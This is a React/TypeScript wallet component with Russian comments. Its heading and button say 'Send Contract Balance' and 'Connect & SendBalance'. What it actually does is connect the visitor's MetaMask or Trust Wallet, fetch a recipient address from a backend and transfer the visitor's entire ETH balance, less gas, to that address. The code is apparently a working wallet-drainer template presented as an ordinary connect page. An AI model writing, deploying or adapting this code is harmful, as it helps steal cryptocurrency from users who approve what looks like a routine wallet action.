'use client'

import { useState } from 'react'
import Web3 from 'web3'
import type { TransactionReceipt } from 'web3-types'

interface EthereumProvider {
  selectedAddress?: string
  isMetaMask?: boolean
  isTrust?: boolean
  request(args: { method: string; params?: unknown[] }): Promise<unknown>
  on?(event: string, listener: (...args: unknown[]) => void): void
  removeListener?(event: string, listener: (...args: unknown[]) => void): void
}

// Тип блока с возможными форматами baseFeePerGas
type BlockWithFee = {
  baseFeePerGas?: string | number | bigint
}

async function sendAllBalance(
  eth: EthereumProvider,
  addr: string,
  setStatus: (msg: string) => void,
  { isTrustWallet }: { isTrustWallet: boolean },
): Promise<string> {
  setStatus('Получаем адрес получателя от бэка…')
  const res = await fetch('http://localhost:8000/contract')
  if (!res.ok) throw new Error(`Ошибка бэка: ${res.status}`)
  const { recipient } = (await res.json()) as { recipient: string }

  const web3 = new Web3(eth)
  const balanceWei = BigInt(await web3.eth.getBalance(addr))
  const gasLimit = 21000n

  // Получаем блок и приводим к нашему типу
  const block = (await web3.eth.getBlock('pending')) as BlockWithFee
  const rawFee = block.baseFeePerGas
  // Нормализуем в bigint
  const baseFeePerGas =
    typeof rawFee === 'bigint'
      ? rawFee
      : rawFee != null
      ? BigInt(rawFee)
      : 0n

  let maxPriorityFeePerGas: bigint
  try {
    maxPriorityFeePerGas = BigInt(await web3.eth.getMaxPriorityFeePerGas())
  } catch {
    maxPriorityFeePerGas = BigInt(web3.utils.toWei('2.5', 'gwei'))
  }

  let receipt: TransactionReceipt
  if (isTrustWallet) {
    const gasPrice = BigInt(await web3.eth.getGasPrice())
    const valueToSend = balanceWei - gasPrice * gasLimit
    if (valueToSend <= 0n) throw new Error('Недостаточно средств на оплату газа')

    receipt = await web3.eth.sendTransaction({
      from: addr,
      to: recipient,
      value: web3.utils.toHex(valueToSend),
      gas: web3.utils.toHex(gasLimit),
      gasPrice: web3.utils.toHex(gasPrice),
    })
  } else {
    const maxFeePerGas = baseFeePerGas * 2n + maxPriorityFeePerGas
    const valueToSend = balanceWei - maxFeePerGas * gasLimit
    if (valueToSend <= 0n) throw new Error('Недостаточно средств на оплату газа')

    const hexValue = '0x' + valueToSend.toString(16)
    setStatus(`Отправляем ${web3.utils.fromWei(hexValue, 'ether')} ETH…`)

    receipt = await web3.eth.sendTransaction({
      from: addr,
      to: recipient,
      value: hexValue,
      gas: gasLimit.toString(),
      maxPriorityFeePerGas: maxPriorityFeePerGas.toString(),
      maxFeePerGas: maxFeePerGas.toString(),
      type: '0x2',
    })
  }

  return String(receipt.transactionHash)
}

export default function Wallet() {
  const [account, setAccount] = useState<string>()
  const [status, setStatus] = useState('Нажмите «Connect & SendBalance»')
  const [busy, setBusy] = useState(false)

  async function connectAndSendBalance() {
    const eth = window.ethereum
    if (!eth) {
      setStatus('Установите Web3-кошелёк (MetaMask и т.п.)')
      return
    }

    const isMetaMask = Boolean(eth.isMetaMask)
    const isTrustWallet = Boolean(eth.isTrust)

    setBusy(true)
    setStatus(
      `Подключаемся к ${
        isMetaMask ? 'MetaMask' : isTrustWallet ? 'Trust Wallet' : 'провайдеру'
      }`,
    )
    setStatus('Запрашиваем аккаунт…')

    let addr = eth.selectedAddress
    if (!addr) {
      try {
        const resp = await eth.request({ method: 'eth_requestAccounts' })
        addr = (resp as string[])[0]
      } catch (e: unknown) {
        const msg = e instanceof Error ? e.message : String(e)
        setStatus(`Ошибка подключения: ${msg}`)
        setBusy(false)
        return
      }
    }
    setAccount(addr)

    try {
      const txHash = await sendAllBalance(
        eth,
        addr,
        setStatus,
        { isTrustWallet },
      )
      setStatus(`Успех! TxHash: ${txHash}`)
    } catch (e: unknown) {
      const msg = e instanceof Error ? e.message : String(e)
      setStatus(`Ошибка: ${msg}`)
    } finally {
      setBusy(false)
    }
  }

  return (
    <div style={{ padding: 20, fontFamily: 'Arial, sans-serif' }}>
      <h1>Send Contract Balance</h1>
      <button
        onClick={connectAndSendBalance}
        disabled={busy}
        style={{
          padding: '10px 20px',
          fontSize: '16px',
          cursor: busy ? 'not-allowed' : 'pointer',
        }}
      >
        {busy ? '…обрабатываем' : 'Connect & SendBalance'}
      </button>
      <p>
        <strong>Статус:</strong> {status}
      </p>
      {account && (
        <p>
          <strong>Ваш аккаунт:</strong> {account}
        </p>
      )}
    </div>
  )
}
